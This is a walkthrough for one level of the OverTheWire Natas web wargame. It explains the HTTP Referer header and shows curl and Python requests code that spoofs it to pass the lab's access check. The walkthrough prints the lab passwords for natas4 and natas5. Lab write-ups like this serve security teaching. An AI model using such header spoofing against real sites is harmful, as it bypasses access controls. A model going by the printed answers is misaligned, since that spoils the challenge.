## Level3 -> Level4 

The description says now it only wants us to come from natas5.

To do that we will need to change the HTTP Referer and send an http request.


What is a HTTP Referer? 

An [HTTP Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer) is a request header that contains the address where a resource has been requested.


In short it tells you which URL you are coming from.


There are multiple ways to send a HTTP request.


### 1. curl


If you're on a Linux machine you can use [curl](https://en.wikipedia.org/wiki/CURL). 


The `--referer` flag lets you change the HTTP Referer.


```bash 
curl --referer http://natas5.natas.labs.overthewire.org/ http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org/
```


You also need to pass the username and password for the url because the website only lets you access it when you provide the proper credentials. 

Fore a detailed explanation read the following post from [serverfault](https://serverfault.com/questions/371907/can-you-pass-user-pass-for-http-basic-authentication-in-url-parameters
).


### 2. Requests Module (Python)


Another way to change the HTTP Referer is to use Python's [requests](https://requests.readthedocs.io/en/latest/) module. 


You'll need to install it via [pip](https://en.wikipedia.org/wiki/Pip_(package_manager)).


```python 
pip install requests 
```


```python 
import requests

headers={'referer':'http://natas5.natas.labs.overthewire.org/'}
auth=('natas4','JDrPnuZAKyl6MkiqQGFIddrqpvgOASth')
res=requests.get('http://natas4.natas.labs.overthewire.org/',headers=headers,auth=auth)
print(res.text)
```


Using either method returns the password in `html`. 


```
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```

Honestly, after reading [this](https://vorpus.org/blog/why-im-not-collaborating-with-kenneth-reitz/), I wouldn't recommend using requests anymore.

However, if you don't have a lot of web knowledge like myself I still think it's the most available HTTP request module. 